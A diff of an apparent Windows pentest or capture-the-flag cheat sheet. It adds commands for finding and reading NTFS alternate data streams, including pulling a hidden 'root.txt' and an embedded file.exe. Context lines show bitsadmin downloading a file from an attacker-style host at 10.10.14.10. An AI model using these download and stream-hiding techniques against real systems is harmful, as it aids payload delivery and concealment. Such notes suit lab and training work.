@@ -51,7 +51,14 @@ bitsadmin /transfer debjob /download /priority normal http://10.10.14.10:8000/wa
 certutil.exe -hashfile Taihou64.exe MD5
 ```
 
+#### Alternate Data streams 
+````
+dir /R file.txt - to check 
+expand hm.txt:root.txt root.txt
+powershell -command " Get-Content C:\ADS\1.txt -Stream file.exe -Raw"
 
+
+````
 
 #### List directory permissions (win server 2003)
 ```sh
